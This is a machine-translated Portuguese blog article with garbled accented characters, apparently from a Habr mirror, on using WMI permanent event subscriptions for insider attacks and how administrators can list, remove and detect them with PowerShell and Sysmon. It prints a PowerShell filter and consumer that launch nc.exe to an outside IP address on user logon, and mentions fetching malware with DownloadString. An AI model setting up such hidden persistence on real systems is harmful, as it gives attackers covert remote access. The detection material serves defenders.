<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Por que eventos constantes devem ser usados ‚Äã‚Äãpara observa√ß√£o? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O correto e, ao mesmo tempo, exigindo um conhecimento mais aprofundado √© usar eventos WMI persistentes. Eventos WMI permanentes, embora com alguma complexidade, n√£o s√£o apenas uma ferramenta mais eficaz para espi√µes internos do que eventos tempor√°rios, mas tamb√©m permitem monitorar de forma mais eficaz as amea√ßas internas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O estudo de eventos persistentes levar√° algum tempo, mas eles representam a maneira mais eficaz de implementar um sistema de monitoramento rigoroso para sistemas grandes. Eles t√™m mais recursos do que eventos WMI tempor√°rios. Eles tamb√©m podem ser usados ‚Äã‚Äãpara alert√°-lo sobre atividades maliciosas n√£o padr√£o, como encapsulamento de DNS ou viola√ß√µes da pol√≠tica de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confian√ßa Zero.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Passei alguns dias estudando eventos persistentes e descobri que o PowerShell tem um cmdlet especial que simplifica o processo de cria√ß√£o de um filtro de eventos, um consumidor e objetos WMI entre o filtro e o consumidor. Como todos sabemos, o PowerShell oferece aos administradores amplas oportunidades para simplificar seu trabalho. Infelizmente, este exemplo mostra como os invasores podem tirar proveito desses √≥timos recursos. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um insider cria um evento constante no sistema de destino, liberando-se dessa necessidade da presen√ßa em uma sess√£o de shell. O evento permanece l√° para sempre ou at√© que seja exclu√≠do explicitamente. Voc√™ pode ler mais sobre como fazer isso </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mas, em geral, o processo √© semelhante ao que fiz acima com um evento tempor√°rio. </font><font style="vertical-align: inherit;">A √∫ltima coisa que nosso hacker precisa √© associar um filtro de eventos a um consumidor de eventos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Concordo que, para um funcion√°rio comum que de repente decidiu se tornar um hacker do mal, isso parece muito legal. </font><font style="vertical-align: inherit;">Por uma quest√£o de interesse, li v√°rios </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">f√≥runs</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e vi que muitas pessoas est√£o lutando sem √™xito para que os eventos constantes do WMI funcionem. </font><font style="vertical-align: inherit;">No entanto, isso n√£o vai al√©m das capacidades do nosso "Snowden" e de outros administradores de sistemas experientes que decidiram mudar para o lado obscuro.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eventos constantes: dicas para administradores de TI</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esses m√©todos n√£o se destinam a treinar hackers em potencial ou funcion√°rios ofendidos que desejam se vingar do empregador. </font><font style="vertical-align: inherit;">Tudo o que quero fazer √© ajudar os profissionais de TI a entender a mentalidade do hacker para que eles possam implementar a prote√ß√£o adequada contra ataques de penetra√ß√£o. </font><font style="vertical-align: inherit;">Para eles, mostro como configurar os objetos de filtro e consumidor usando o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Set-WmiInstance</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = ‚Äúcruella‚Äù<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sua tarefa √© criar o c√≥digo do PowerShell que vincula esses dois componentes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No decorrer dos meus pr√≥prios testes, pude obter um evento permanente para trabalhar no sistema de destino sem esfor√ßo e sofrimento excessivos. </font><font style="vertical-align: inherit;">Como voc√™ se lembra, isso foi muito dif√≠cil de alcan√ßar com eventos WMI tempor√°rios que duram apenas uma sess√£o do PowerShell.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ao configurar um evento WMI persistente, por exemplo, para monitorar o logon dos usu√°rios, n√£o √© necess√°rio que um insider ou hacker permane√ßa no sistema de destino. Um b√¥nus adicional √© que um evento WMI persistente √© robusto: quando o computador √© reiniciado, os gatilhos de eventos ainda funcionam. Isso torna os eventos persistentes do WMI uma maneira poderosa e secreta de desencadear um ataque, o que pode envolver muito mais do que apenas monitorar. Como voc√™ se lembra, os eventos WMI est√£o longe de ser o primeiro lugar em que os especialistas em seguran√ßa procurar√£o a origem do ataque. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por exemplo, o c√≥digo do PowerShell para um consumidor de eventos pode atuar como iniciador e baixar malware armazenado em um servidor remoto usando o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . √ìtima </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apresenta√ß√£o</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber, na confer√™ncia Black Hat, cont√©m muitas informa√ß√µes sobre o potencial malicioso de eventos WMI persistentes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se voc√™ √© um especialista em seguran√ßa, como trabalhar√° com eventos WMI em termos de seu potencial uso malicioso? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Boa sorte do seu lado: usando o cmdlet Get-WmiObject (tamb√©m conhecido como gwmi), voc√™ pode criar uma lista de filtros de eventos, consumidores e objetos de liga√ß√£o:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Voc√™ lista eventos persistentes WMI usando Get-WMIObject e define os par√¢metros apropriados. </font><font style="vertical-align: inherit;">Observe a falta de um carimbo de data / hora. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora, se eles acharem suspeito o filtro (ou consumidor) de um evento permanente, os profissionais de TI poder√£o desativ√°-lo removendo-o usando o pipeline do PowerShell e o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet WMI-RemoveObject</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A remo√ß√£o de eventos WMI persistentes envolve o uso do pipeline do PowerShell. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Observe que nem a hora em que o evento foi gerado nem o nome do usu√°rio mal-intencionado s√£o especificados aqui. </font><font style="vertical-align: inherit;">Para obter essas informa√ß√µes forenses, voc√™ precisar√° consultar os logs de eventos do Windows. </font><font style="vertical-align: inherit;">Mais sobre isso abaixo.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Posso desativar os eventos WMI persistentes?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No m√≠nimo, os profissionais de TI podem ver rapidamente os eventos persistentes WMI registrados e come√ßar a analisar cen√°rios da vida real em busca de sinais de amea√ßas. Talvez, como um especialista em seguran√ßa de TI experiente, voc√™ pense que nem todo mundo precisa de WMI em laptops, e a melhor estrat√©gia para lidar com vulnerabilidades de eventos persistentes de WMI √© desativar completamente o WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voc√™ pode tentar desabilitar o servi√ßo </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que inicia o WMI. Na pr√°tica, isso n√£o √© t√£o simples. No decorrer dos meus pr√≥prios testes, n√£o consegui desativar esse servi√ßo: ele foi iniciado automaticamente novamente. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Suponha que voc√™ ainda conseguiu desativ√°-lo. O software administrativo do Windows depende muito do WMI e n√£o funcionar√° se o Winmgmt estiver indispon√≠vel. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">F√≥runs em</font></a><font style="vertical-align: inherit;"> toda a Internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">preenchido com mensagens alertando contra a desativa√ß√£o do WMI. </font><font style="vertical-align: inherit;">Eu aconselho voc√™ a ouvir e ter piedade de seu WMI.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identificar eventos WMI de amea√ßas com Sysmon e SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em geral, voc√™ precisar√° aceitar a vulnerabilidade de evento WMI como um fato. Felizmente, existem maneiras mais eficientes de detectar eventos persistentes e outras opera√ß√µes de eventos suspeitos no Windows do que usar o cmdlet Powershell mencionado acima. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Conhe√ßa Sysmon! N√£o entrarei em detalhes sobre esse utilit√°rio gratuito do Windows, que pode ser baixado </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> neste artigo. S√≥ posso dizer que permite obter informa√ß√µes muito √∫teis para an√°lise em um s√≥ lugar, em vez de exibir cada log de eventos do Windows individualmente. Os usu√°rios do Windows 7 e posteriores podem n√£o precisar do Sysmon, pois os sistemas Windows mais recentes usam mecanismos de log padr√£o mais avan√ßados.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 O Sysmon √© uma ferramenta conveniente e intuitiva de registro de eventos da Microsoft, que </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
atribui o identificador de evento 19 √† cria√ß√£o de um evento de filtro WMI permanente (20 √© designado para criar um evento de consumidor WMI e 21 √© atribu√≠do √† liga√ß√£o WMI). Se voc√™ abrir o visualizador de eventos, encontrar√° o log de eventos do Sysmon na se√ß√£o Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voc√™ n√£o deseja abrir o visualizador de eventos manualmente para monitorar eventos WMI persistentes, o que pode ser um sinal de atividade de hackers. N√≥s sabemos como ajud√°-lo. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por que n√£o criar um filtro de eventos persistentes WMI para monitorar a cria√ß√£o (adivinhado?) De um evento persistente WMI? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">H√° um pequeno projeto em que voc√™ encontrar√° o c√≥digo para configurar esta opera√ß√£o. </font><font style="vertical-align: inherit;">Aqui est√° um trecho de c√≥digo para um filtro de eventos WMI que permite rastrear a cria√ß√£o de ... sim, um filtro de eventos WMI:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obviamente, aqui precisamos da ajuda de ferramentas de seguran√ßa da informa√ß√£o e gerenciamento de eventos de seguran√ßa (SIEM), porque as evid√™ncias est√£o enterradas nos escombros de revistas. </font><font style="vertical-align: inherit;">Eu acho que voc√™ entende para onde tudo est√° indo. </font><font style="vertical-align: inherit;">Voc√™ precisar√° de uma </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">solu√ß√£o de monitoramento de seguran√ßa</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que combine os recursos do SIEM com a an√°lise de outras amea√ßas para detectar e eliminar amea√ßas associadas a eventos WMI persistentes.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Perguntas freq√ºentes sobre a instrumenta√ß√£o de gerenciamento do Windows</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Os m√©todos descritos acima podem muito bem ser usados ‚Äã‚Äãpara implementar um sistema de vigil√¢ncia na sua rede; no entanto, voc√™ pode ter algumas perguntas sobre o WMI. </font><font style="vertical-align: inherit;">Nesta se√ß√£o, responderemos aos mais comuns.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O WMI est√° obsoleto?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O WMI em si n√£o est√° desatualizado, mas o WMIC foi preterido, o que √© confuso para muitas pessoas. </font><font style="vertical-align: inherit;">O PowerShell agora √© usado para acessar as fun√ß√µes fornecidas anteriormente pelo WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Quais portas o WMI usa? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O WMI usa a porta TCP 135 e v√°rias portas din√¢micas: 49152-65535 (portas RPC din√¢micas: Windows Vista, 2008 e superior), TCP 1024-65535 (portas RPC din√¢micas: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Voc√™ tamb√©m pode configurar um intervalo de portas personalizado para WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O WMI usa o WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essa configura√ß√£o n√£o √© padr√£o, mas voc√™ pode usar o WMI para recuperar dados usando scripts ou aplicativos usando a API de script do WinRM ou usando a ferramenta de linha de comando do Winrm. </font><font style="vertical-align: inherit;">O WinRM pode usar o WMI para coletar dados de recursos ou gerenciar recursos no sistema operacional Windows.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conclus√£o</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como vimos, o WMI fornece aos administradores uma ferramenta poderosa para monitorar processos e computadores remotos e pode ser usado no desenvolvimento de EUMAs (acordos de monitoramento do usu√°rio final) para alertar automaticamente atividades suspeitas. </font><font style="vertical-align: inherit;">Isso o torna uma √≥tima ferramenta para detectar e eliminar amea√ßas internas, impedindo tentativas de burlar as pol√≠ticas de seguran√ßa, al√©m de monitorar como seus sistemas s√£o usados. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se voc√™ quiser saber mais sobre como usar o WMI para monitorar atividades internas, fa√ßa o download do nosso guia detalhado </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt507048/index.html">Olya, testes e f√°brica - o caminho para uma bela arquitetura e c√≥digo limpo</a></li>
<li><a href="../pt507050/index.html">An√°lise do design do jogo Hollow Knight. Parte 1. Estradas Esquecidas</a></li>
<li><a href="../pt507052/index.html">O melhor cientista de dados n√£o perde tempo com estat√≠sticas</a></li>
<li><a href="../pt507058/index.html">Joel Spolsky: Papel de Gamifica√ß√£o no Sucesso do Stack Overflow</a></li>
<li><a href="../pt507066/index.html">10 maneiras de automatizar an√∫ncios no Google Ads</a></li>
<li><a href="../pt507074/index.html">Folha de dicas do SIMD, agora para .NET Core</a></li>
<li><a href="../pt507078/index.html">O tribunal ordenou que a m√≠dia removesse o artigo de outra pessoa e publicasse uma refuta√ß√£o no Yandex principal</a></li>
<li><a href="../pt507080/index.html">Todos os copos: a hist√≥ria de um grande projeto de ecossistema</a></li>
<li><a href="../pt507084/index.html">Os partidos SpatialChat se tornaram populares durante a pandemia - e √© improv√°vel que terminem depois da enseada</a></li>
<li><a href="../pt507086/index.html">Converter script Bash em c√≥digo C # para enviar SMS via modem usb HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>